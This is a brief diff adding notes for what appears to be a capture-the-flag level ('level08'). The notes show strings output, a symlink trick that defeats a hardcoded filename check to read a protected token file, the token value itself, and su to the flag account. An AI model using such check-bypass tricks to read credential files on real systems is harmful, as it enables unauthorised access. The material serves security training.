@@ -1,0 +1,16 @@
+strings level08
+->"
+%s [file to read]
+token
+You may not access '%s'
+Unable to open %s
+Unable to read fd %d"
+
+'token' is hardcoded
+just use a symlink
+
+ln -s ~/token /tmp/test; ./level08 /tmp/test
+->25749xKZ8L7DkSCwJkT9dyv6f
+su flag08
+25749xKZ8L7DkSCwJkT9dyv6f
+->win
